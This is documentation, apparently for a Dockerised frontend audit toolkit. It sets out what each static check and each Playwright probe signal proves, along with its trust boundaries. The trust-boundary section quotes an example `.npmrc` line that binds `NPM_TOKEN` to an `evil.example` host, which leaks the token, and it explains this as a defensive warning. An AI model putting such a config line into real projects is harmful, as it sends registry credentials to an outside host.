# Tooling matrix

What each tool of the audit proves, what it cannot prove, and how to run it.
Everything runs in Docker with pinned versions; nothing is installed on the
host and the audited checkout is mounted read-only.

## Pinned versions

| Component | Version | Where it is pinned |
|---|---|---|
| Node image | `node:22.23.5-bookworm-slim` | `scripts/static-battery.sh` (`NODE_IMAGE`) |
| Playwright image | `mcr.microsoft.com/playwright:v1.65.1-noble` | `scripts/run-probe.sh` (`PLAYWRIGHT_VERSION`) |
| playwright-core / axe-core | 1.65.1 / 4.14.1 | `scripts/run-probe.sh` |
| Nu Html Checker | image digest `sha256:f10441ae...` | `scripts/static-battery.sh` (`VNU_IMAGE`); that registry has no version tags |
| osv-scanner | `v2.7.1` | `scripts/static-battery.sh` (`OSV_IMAGE`) |
| ESLint, plugins, stylelint, knip | see `TOOLS` | `scripts/lib/battery-inner.sh` |

The project's own TypeScript, ESLint and stylelint are used at the project's
versions (that is what its CI runs). The audit overlay and the fallback
stylelint config use the pinned ones.

## Trust boundary

The build command, the project's ESLint, stylelint and knip configs, its
package-manager config and dependency lifecycle scripts are code written by
the audited project. The battery treats them as untrusted. Four containers:

| Stage | Runs | Sees |
|---|---|---|
| `tools` | Install of the pinned audit tools | No project file, no credential |
| `install` | Copy of the checkout, `npm ci` / `pnpm install` / `yarn install` | Network; `NPM_TOKEN` / `NODE_AUTH_TOKEN` when set. Lifecycle scripts off unless `--allow-scripts` (Yarn Berry: `--mode=skip-build`) |
| `run` | tsc, ESLint, stylelint, knip, the build | **No network** (unless `--online`), no credential, pinned tools read-only, no host mount except the output folder |
| `advisories` | `npm audit` / `pnpm audit` / `yarn npm audit` on a fresh copy of the read-only checkout | Network, no credential, nothing written by `run`; pnpmfile ignored, Yarn skipped when `.yarnrc.yml` loads code |

Verified on a test project whose build looks for the token, tries to write
into the tools volume and to reach the registry: token absent (own
environment and PID 1's), write refused, network `EAI_AGAIN`.

Package-manager config runs or routes even with lifecycle scripts off
(verified in Docker): `.pnpmfile.cjs` runs at `pnpm install --ignore-scripts`
and at `pnpm audit`, with the token in its environment; `yarnPath` in
`.yarnrc.yml` runs at every `yarn` call; a project `.npmrc` with
`//npm.evil.example/:_authToken=${NPM_TOKEN}` sends `Bearer <token>` to that
host. So, with a token set, `static-battery.sh` refuses to start while the
project has `.npmrc`, `.yarnrc*`, `pnpm-workspace.yaml` registry or auth
lines, or a pnpmfile, and lists them as file, line, setting name and URL
host: values are never printed (a `.npmrc` can hold a literal `_authToken`). Read them: every host the token is
bound to must be a registry the owner named, every pnpmfile, `yarnPath` or
plugin must have been read. Then pass `--trust-pm-config`. Otherwise run
without the token: private packages fail to install, list them under "Not
verified".

What remains exposed, and the rule for each:

- `--allow-scripts` runs lifecycle scripts in the `install` stage, **with** the
  token. Read the `preinstall`/`install`/`postinstall` scripts first; use a
  read-only, short-lived token; on a repo you do not trust, never both.
- `install` has network, and a pnpmfile, `yarnPath` or Yarn plugin runs there
  even without a token: on a pnpm or Yarn repo you do not trust, read them
  first. The offline guarantee covers the build, lint configs and knip.
- `--online` gives `run` network too; project code can then send the checkout
  anywhere: only on a repo you trust.
- Every stage writes the output folder, so project code in `run` can alter
  another tool's raw output. The outputs are evidence about a cooperative
  project, not proof against a hostile one.
- Probe outputs (`interaction-probe.json`, `dom/*.html`) hold URLs, console
  text and rendered pages of a possibly authenticated session: personal data
  and tokens can be in them. Keep `$OUT` outside the repo, redact before
  sharing, delete `storage-state.json` when the audit ends.

## Static battery

`scripts/static-battery.sh --project <dir> --out <dir outside the project> [--build "npm run build"]`

| Tool id | Runs | Proves | Cannot prove |
|---|---|---|---|
| `tsc` | Project's `tsc` (or `vue-tsc`) `--noEmit` on one tsconfig; the note gives the number of project files checked | Those files type-check under the project's own settings | Runtime type safety: `any`, casts and unvalidated API payloads pass. Other tsconfigs of the repo (`tsconfig.node.json`) are not checked. A solution-style `tsconfig.json` is replaced by `tsconfig.app.json` when it exists; otherwise the tool is `skipped` with "0 project files": pass `--tsconfig`. With `--ignore-scripts`, frameworks that generate types at install (Nuxt, SvelteKit) report false errors |
| `tsc-strict` | Same with `--strict --noUncheckedIndexedAccess --noImplicitOverride` | Lower bound of the surface the project's settings leave unchecked (a strict sub-option set to `false` in the tsconfig stays off) | That each extra error is a bug |
| `svelte-check` | When installed | Type and a11y diagnostics inside `.svelte` files | - |
| `eslint-project` | Project's ESLint and config | What the team already agreed to enforce is (not) respected | Anything the config does not enable. No config at all is reported as `skipped`: a finding unless another linter (Biome, oxlint, `ng lint`) gates CI |
| `eslint-audit` | `scripts/eslint-audit.config.mjs`, pinned plugins, inline disables ignored | Presence of known state/render/a11y anti-patterns in React, Vue, Svelte, Solid, Lit sources | Absence of them: rules are syntactic, they miss indirection (a selector defined in another file, a setter called through a helper). No type information. Angular is not covered: run the project's `ng lint` |
| `stylelint` | Project config, else validity-only fallback on `.css` | Unknown properties, invalid values and units, duplicate selectors | With the fallback: nothing about Sass, Less or styles inside `.vue`/`.svelte` files (reported in the note). Never: unused CSS, visual correctness |
| `knip` | `knip --reporter json` | Files, exports and dependencies nothing references | False positives on dynamic imports, framework conventions (file-based routes) and config-referenced files when the project has no `knip.json`. Treat as candidates |
| `bundle` | `scripts/lib/bundle-sizes.mjs` on the build output | Shipped bytes per asset (raw, gzip, brotli); a static estimate of first-load JS and CSS: the files `index.html` references, gzip level 9 | What the browser really transfers on a given route. The estimate misses static imports that are not preloaded and third-party scripts (so it can be too low) and ignores Brotli, caching and service workers (so it can be too high). Lighthouse's network view on a cold navigation is the measurement |
| `npm-audit` | `npm audit --omit=dev` (or pnpm / yarn equivalent) | Known advisories in the production dependency tree | Reachability: whether the vulnerable code path ships and is called |
| `osv` | `osv-scanner` on the lockfile | Same, from the OSV database, dev dependencies included | Same. Needs network access to `api.osv.dev` |
| `vnu` | Nu Html Checker with `--also-check-css` on built `.html`/`.css` and `--html-dir` folders | HTML conformance errors, CSS parse errors (the offline equivalent of the W3C validators) | On a single-page app the built `index.html` is an empty shell: validate rendered DOM instead (below) |

`<out>/summary.json` holds one entry per tool: `state` (`ran`, `skipped`,
`error`, `unreadable`), `findings` (count) and `detail` (top rules, severities).
A tool that is not `ran` goes to the report's "Not verified" section.

Validating rendered DOM: add `{ "dumpDom": "name" }` steps to the probe flows,
then run the validator alone, in its own output folder (a second run in the
same folder would overwrite `summary.json`):
`static-battery.sh --project <dir> --out $OUT/static-dom --only vnu --html-dir $OUT/probe/dom`.
With `--only vnu` nothing is installed: it takes seconds. Limit: a serialised DOM
has already been repaired by the HTML parser, so errors the parser recovers
from (unclosed tags, misnested inline elements) are gone; duplicate ids,
invalid ARIA and forbidden children are still reported.

Deeper bundle analysis, when `bundle.json` shows a problem and source maps
exist (run inside the project's own container, never on the host):

```bash
npx source-map-explorer 'dist/assets/*.js' --json sme.json   # bytes per source module
npx size-limit --json                                        # when the project defines budgets
```

Typical findings: one library imported whole (`import _ from 'lodash'`), two
versions of the same package, locale data for every language, a development
build of a framework in the production bundle.

## Interaction probe

`scripts/run-probe.sh --flows flows.json --out <dir> [--base-url URL | --serve dist] [--runs 3] [--cpu 4]`

`scripts/run-probe.sh --self-test` runs the bundled fixture and **asserts** it:
each defect of `scripts/fixtures/slow-page.html` must raise its flag, `#fast`
must raise none, `hover` must report `not-applicable` and a `check` on an
already checked box must report `no-input-event`. Exit 3 on a failed assertion.

Only the audit host itself (`localhost`, `127.0.0.1`, `::1`,
`host.docker.internal`, `--serve`) is driven without `--authorized-target`.
A private IP or a compose service name is refused like any other host: an
address class says nothing about who owns it. Approval covers the page host,
the backends it calls and the actions of the flows; on production, read-only
flows only. The run prints `origins contacted` (also
`meta.requestOrigins`): an origin outside the approved scope (a local front
end calling a production API) stops the audit until the owner approves it.

### Flows file

```json
{
  "baseUrl": "http://host.docker.internal:5173",
  "flows": [
    {
      "name": "search-and-open",
      "steps": [
        { "goto": "/orders", "label": "cold load" },
        { "type": ["input[name=q]", "dupont"], "label": "filter while typing" },
        { "click": "tr[data-id='42']", "expect": "[data-testid=order-detail][data-order-id='42']" },
        { "scroll": 3000, "in": ".order-lines" },
        { "axe": true },
        { "dumpDom": "order-detail" }
      ]
    }
  ]
}
```

| Step | Value | Measures |
|---|---|---|
| `goto` | URL or path | Navigation timing, LCP, DOM size, load-time console and network errors |
| `click`, `dblclick`, `check` | Playwright selector | Interaction latency, long tasks, forced layout, commits, mutations |
| `type` | `[selector, text]`, optional `delayMs` | One interaction per key: per-keystroke latency |
| `press` | Key name (`Enter`, `Tab`) | As `click`. Also the tool of the keyboard pass |
| `hover`, `fill`, `select` | Selector, or `[selector, value]` | Long tasks, forced layout, commits, mutations. **No latency** (`n/a`): they dispatch no pointer or key interaction. Use `type` to measure input lag |
| `scroll` | Pixels, optional `in` selector | Frame intervals, late frames. No latency (`n/a`) |
| `waitFor` / `wait` | Selector / milliseconds | Nothing: sequencing only |
| `axe` | `true` or a CSS scope | Accessibility violations of the state reached by the flow |
| `dumpDom` | File name | Writes the rendered DOM for the HTML validator |

Per-step options: `label`, `settleMs` (default 700: how long entries are
collected after the action), `expect` (a plain **CSS** selector that is not
visible before the action; yields `visibleAfterMs`). Playwright-only syntax
(`text=Saved`, `>> nth=0`) is valid in an action, not in `expect`.

`expect` checks that something became visible, not that it is the right thing.
Make the selector carry the meaning: `[data-order-id='42']` proves the opened
order is the clicked one; `.detail-panel` proves only that a panel opened.

Cold state: every flow of every run starts in a new browser context, so cache,
cookies (other than `--storage-state`) and service workers are empty at its
first `goto`. A second `goto` in the same flow is a warm navigation.

Reaching the application, safest first: a static build served inside the
container with `--serve dist`; a compose service with
`PROBE_NETWORK=<network>` and `--authorized-target`; a dev server on the host at
`http://host.docker.internal:<port>`. On Linux that last one needs the server
to listen on the Docker bridge address (`ip -4 addr show docker0`, usually
`172.17.0.1`), not only on `127.0.0.1`. Binding to `0.0.0.0` also works but
exposes an unauthenticated dev server to the whole local network: only on a
network you trust. Authenticated flows: produce a
Playwright storage state with the project's own login helper (see the
`testing-and-debugging:playwright-auth-factory` skill), for a synthetic account, and pass
`--storage-state <file>`. That file is a live session: keep it outside the
repo, readable by you only (`chmod 600`), and delete it after the audit.

### What the probe proves and what it cannot

| Signal | Proves | Cannot prove |
|---|---|---|
| `latencyMs`, `latencyStatus` | This interaction blocked the next paint for that long, here; or why there is no number (`below-threshold`: input seen, no entry, not a pass; `not-applicable`; `no-input-event`) | The page's INP: a field value, the 75th percentile over page views of each view's worst interaction |
| `latencyBreakdown` | Whether time went to waiting for the main thread (`inputDelayMs`), to listeners (`processingMs`) or to rendering (`presentationMs`) | Which line of code: use `topScripts`, then a DevTools profile |
| `topScripts` | Script URL, character offset and invoker of the scripts in long frames | Anything in frames under 50 ms. Cross-origin scripts are not attributed. No attribution on `file://` pages: serve over HTTP |
| `forcedLayoutMs` | Scripts forced style and layout synchronously, and for how long | That it is thrashing: one legitimate measurement after a large DOM write costs the same. Thrashing is a repeated write/read pair, confirmed in the source. Small forced layouts spread over short frames are not seen |
| `frames` (scroll) | Share of `requestAnimationFrame` intervals over 25 ms: late main-thread frames | Frames dropped by the compositor: a compositor-driven scroll can stay smooth while the main thread is late |
| `reactCommits` | Number of React **root** commits during the step (production builds too) | Which components rendered or why. `reactRenderMs` exists only in development or profiling builds. Verified on React 18.3.1; a page that ships its own DevTools hook is left untouched and reports 0 |
| `vueComponentUpdates` | Component updates of a Vue 3 **development** build | Anything on a production build (always 0) |
| `domMutations` | Volume of DOM writes: a framework-agnostic proxy for render work | Whether the writes were necessary |
| `visibleAfterMs` | Time from the first input event to the expected element being rendered | Perceived completeness (the element may show a spinner) |
| Console, page errors, failed requests, HTTP >= 400 | They occurred during this step | Their absence on paths the flows do not walk |
| `axeViolations` | Rule violations detectable by rules, in the reached state | Conformance. Keyboard operability (do the keyboard pass), focus order and visibility, meaningful alt text, screen-reader experience, zoom and reflow: human checks, listed under "Not verified" when nobody did them |

Known distortions: headless Chromium only (no Safari or Firefox engine
behaviour); the mutation observer and the commit hook add a small overhead
(disable with `--no-mutations`, `--no-react-hook` to check); `--serve` has no
compression or HTTP/2, so its load metrics are not representative; a step that
triggers a full page load loses the old document's entries and is reported as
`fullPageLoad` with navigation metrics instead.

Framework commit times beyond the probe: React DevTools Profiler (per
component, with reasons) on a profiling build; Vue DevTools performance tab;
Angular DevTools profiler; `performance.measure` entries emitted by the
framework in development builds, visible in a DevTools Performance recording.
A Playwright trace (`trace: 'retain-on-failure'` in the project's own
Playwright config, as the `testing-and-debugging:e2e-playwright` skill's template sets it) records
the same run for later inspection.

## URL-level checks: reuse `web-analysis`

Not reimplemented here. Run them with the `testing-and-debugging:web-analysis` skill against the
same build the probe used. They need a URL they can reach: `--serve` lives
only inside the probe container, so serve the build separately (the project's
preview server, a compose service) for these tools. Skill not available: keep
the probe's `axe` step and list the rest under "Not verified".

| Need | Tool there | Complements |
|---|---|---|
| Core Web Vitals in lab, performance score, SEO | Lighthouse (`resources/lighthouse.md`) | The probe's `goto` navigation metrics |
| WCAG scan of a URL | pa11y, axe-core CLI | The probe's `axe` step, which covers states reached after interaction |
| Dead links | broken-link-checker | The probe's failed requests (assets and API calls, not `<a href>` targets) |
| HTML rules on a URL | html-validate | `vnu` here (conformance) |
| Security headers | curl + jq | - |
| Throttled multi-run timings | sitespeed.io | - |

## Candidate patterns

`scripts/smell-grep.sh <src>` prints grep candidates per smell id. It is
deliberately over-inclusive and deliberately dumb: it exists to tell the
reviewer where to read, and its counts must never appear in a report as
findings.
